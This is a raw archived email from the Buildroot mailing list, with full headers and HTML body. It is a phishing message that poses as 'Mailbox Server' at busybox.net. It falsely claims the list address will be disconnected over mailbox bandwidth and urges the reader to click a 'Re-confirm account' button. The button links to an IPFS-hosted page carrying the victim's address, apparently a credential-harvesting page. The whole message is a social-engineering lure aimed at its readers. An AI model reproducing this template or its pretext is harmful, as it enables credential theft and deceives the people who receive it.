Return-Path: <buildroot-bounces@buildroot.org>
X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
	aws-us-west-2-korg-lkml-1.web.codeaurora.org
Received: from smtp2.osuosl.org (smtp2.osuosl.org [140.211.166.133])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by smtp.lore.kernel.org (Postfix) with ESMTPS id C4DFFC54E58
	for <buildroot@archiver.kernel.org>; Tue, 12 Mar 2024 07:33:07 +0000 (UTC)
Received: from localhost (localhost [127.0.0.1])
	by smtp2.osuosl.org (Postfix) with ESMTP id 3FB8640472;
	Tue, 12 Mar 2024 07:33:07 +0000 (UTC)
X-Virus-Scanned: amavisd-new at osuosl.org
Received: from smtp2.osuosl.org ([127.0.0.1])
	by localhost (smtp2.osuosl.org [127.0.0.1]) (amavisd-new, port 10024)
	with ESMTP id YCFuLb3ZRBcI; Tue, 12 Mar 2024 07:33:06 +0000 (UTC)
X-Comment: SPF check N/A for local connections - client-ip=140.211.166.34; helo=ash.osuosl.org; envelope-from=buildroot-bounces@buildroot.org; receiver=<UNKNOWN> 
DKIM-Filter: OpenDKIM Filter v2.11.0 smtp2.osuosl.org 577DF40486
Received: from ash.osuosl.org (ash.osuosl.org [140.211.166.34])
	by smtp2.osuosl.org (Postfix) with ESMTP id 577DF40486;
	Tue, 12 Mar 2024 07:33:06 +0000 (UTC)
Received: from smtp1.osuosl.org (smtp1.osuosl.org [140.211.166.138])
 by ash.osuosl.org (Postfix) with ESMTP id 926C81BF2B5
 for <buildroot@lists.busybox.net>; Tue, 12 Mar 2024 07:33:04 +0000 (UTC)
Received: from localhost (localhost [127.0.0.1])
 by smtp1.osuosl.org (Postfix) with ESMTP id 80551814AB
 for <buildroot@lists.busybox.net>; Tue, 12 Mar 2024 07:33:04 +0000 (UTC)
X-Virus-Scanned: amavisd-new at osuosl.org
Received: from smtp1.osuosl.org ([127.0.0.1])
 by localhost (smtp1.osuosl.org [127.0.0.1]) (amavisd-new, port 10024)
 with ESMTP id BwL5Ig8OCpJa for <buildroot@lists.busybox.net>;
 Tue, 12 Mar 2024 07:33:03 +0000 (UTC)
X-Greylist: delayed 59783 seconds by postgrey-1.37 at util1.osuosl.org;
 Tue, 12 Mar 2024 07:33:03 UTC
DMARC-Filter: OpenDMARC Filter v1.4.2 smtp1.osuosl.org 939F381496
DKIM-Filter: OpenDKIM Filter v2.11.0 smtp1.osuosl.org 939F381496
Received-SPF: Softfail (mailfrom) identity=mailfrom; client-ip=96.47.235.14;
 helo=busybox.net; envelope-from=buildroot@busybox.net; receiver=<UNKNOWN> 
Received: from busybox.net (unknown [96.47.235.14])
 by smtp1.osuosl.org (Postfix) with ESMTP id 939F381496
 for <buildroot@busybox.net>; Tue, 12 Mar 2024 07:33:03 +0000 (UTC)
From: Mailbox Server <buildroot@busybox.net>
To: buildroot@busybox.net
Date: 12 Mar 2024 00:33:24 -0700
Message-ID: <20240312003324.1D438E27C0CCFFDC@busybox.net>
MIME-Version: 1.0
X-Mailman-Original-Authentication-Results: smtp1.osuosl.org;
 dmarc=none (p=none dis=none)
 header.from=busybox.net
Subject: [Buildroot] buildroot@busybox.net Mailbox Confirmation
X-BeenThere: buildroot@buildroot.org
X-Mailman-Version: 2.1.29
Precedence: list
List-Id: Discussion and development of buildroot <buildroot.buildroot.org>
List-Unsubscribe: <https://lists.buildroot.org/mailman/options/buildroot>,
 <mailto:buildroot-request@buildroot.org?subject=unsubscribe>
List-Archive: <http://lists.buildroot.org/pipermail/buildroot/>
List-Post: <mailto:buildroot@buildroot.org>
List-Help: <mailto:buildroot-request@buildroot.org?subject=help>
List-Subscribe: <https://lists.buildroot.org/mailman/listinfo/buildroot>,
 <mailto:buildroot-request@buildroot.org?subject=subscribe>
Content-Type: multipart/mixed; boundary="===============6703431173892016693=="
Errors-To: buildroot-bounces@buildroot.org
Sender: "buildroot" <buildroot-bounces@buildroot.org>

--===============6703431173892016693==
Content-Type: text/html;
	charset="iso-8859-1"
Content-Transfer-Encoding: quoted-printable

<html><head>
<meta name=3D"GENERATOR" content=3D"MSHTML 11.00.9600.20139">
<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
</head>
<body>
<p style=3D"text-align: left; color: rgb(34, 34, 34); text-transform: none;=
 text-indent: 0px; letter-spacing: normal; font-family: Arial, Helvetica, s=
ans-serif; font-size: small; font-style: normal; font-weight: 400; margin-t=
op: 0px; word-spacing: 0px; white-space: normal; box-sizing: border-box; or=
phans: 2; widows: 2; background-color: rgb(255, 255, 255); font-variant-lig=
atures: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; =
text-decoration-thickness: initial;=20
text-decoration-style: initial; text-decoration-color: initial;"><font size=
=3D"2"><font face=3D"Verdana" style=3D"box-sizing: border-box;">Dear&nbsp;b=
uildroot</font><font face=3D"Verdana" style=3D"box-sizing: border-box;">,</=
font></font></p>
<div style=3D"text-align: left; color: rgb(34, 34, 34); text-transform: non=
e; text-indent: 0px; letter-spacing: normal; font-family: Arial, Helvetica,=
 sans-serif; font-size: small; font-style: normal; font-weight: 400; word-s=
pacing: 0px; white-space: normal; box-sizing: border-box; orphans: 2; widow=
s: 2; background-color: rgb(255, 255, 255); font-variant-ligatures: normal;=
 font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration=
-thickness: initial; text-decoration-style:=20
initial; text-decoration-color: initial;"><font size=3D"2" style=3D"color: =
rgb(0, 0, 0); box-sizing: border-box;"><br style=3D"box-sizing: border-box;=
"></font></div>
<div style=3D"text-align: left; color: rgb(34, 34, 34); text-transform: non=
e; text-indent: 0px; letter-spacing: normal; font-family: Arial, Helvetica,=
 sans-serif; font-size: small; font-style: normal; font-weight: 400; word-s=
pacing: 0px; white-space: normal; box-sizing: border-box; orphans: 2; widow=
s: 2; background-color: rgb(255, 255, 255); font-variant-ligatures: normal;=
 font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration=
-thickness: initial; text-decoration-style:=20
initial; text-decoration-color: initial;"><font face=3D"verdana" size=3D"2"=
 style=3D"box-sizing: border-box;"><font color=3D"#000000" style=3D"box-siz=
ing: border-box;">We noticed that your&nbsp;buildroot@busybox.net&nbsp;</fo=
nt><font color=3D"#000000" style=3D"box-sizing: border-box;">will be discon=
nected from sending and receiving mails soon due to lack of mailbox&nbsp;ba=
ndwidth.</font><br style=3D"box-sizing: border-box;"><br style=3D"box-sizin=
g: border-box;"><font color=3D"#000000" style=3D"box-sizing: border-box;">
We urge you to re-confirm if your account is still active on our server to =
officially unlock it to your default settings.</font><br style=3D"box-sizin=
g: border-box;"><br style=3D"box-sizing: border-box;"></font>
<table width=3D"400" height=3D"40" style=3D"color: rgb(0, 0, 0); font-famil=
y: monospace; font-size: 11px; border-collapse: collapse; box-sizing: borde=
r-box;" bgcolor=3D"#424242">
<tbody style=3D"box-sizing: border-box;">
<tr style=3D"box-sizing: border-box;">
<td style=3D"margin: 0px; box-sizing: border-box;"><font face=3D"verdana" s=
ize=3D"2" style=3D"box-sizing: border-box;">
<div align=3D"center" style=3D"box-sizing: border-box;"><font color=3D"#fff=
fff" face=3D"verdana" size=3D"2" style=3D"box-sizing: border-box;"><a style=
=3D"color: rgb(17, 85, 204); text-decoration: none; box-sizing: border-box;=
 background-color: transparent;" href=3D"https://cloudflare-ipfs.com/ipfs/b=
afkreihhzyqdgtxu6techcklml56rtnzrt62dftj5pc7ltpcg5sypcfhkq?filename#buildro=
ot@busybox.net" target=3D"_blank" rel=3D"noreferrer">Re-confirm account</a>=
</font></div></font></td></tr></tbody></table>
<font face=3D"verdana" size=3D"2" style=3D"box-sizing: border-box;"><br sty=
le=3D"box-sizing: border-box;"><br style=3D"box-sizing: border-box;"><font =
color=3D"#000000" style=3D"box-sizing: border-box;">Once confirmation is co=
mplete, your mailbox will work effectively.</font><br style=3D"box-sizing: =
border-box;"><br style=3D"box-sizing: border-box;"><font color=3D"#000000" =
style=3D"box-sizing: border-box;">Copyright&#65533;&nbsp;busybox.net</font>=
</font>
<span style=3D"color: rgb(0, 0, 0); font-family: verdana; box-sizing: borde=
r-box;">
&nbsp;<font size=3D"1">All rights reserved.</font></span></div></body></htm=
l>

--===============6703431173892016693==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
buildroot mailing list
buildroot@buildroot.org
https://lists.buildroot.org/mailman/listinfo/buildroot

--===============6703431173892016693==--
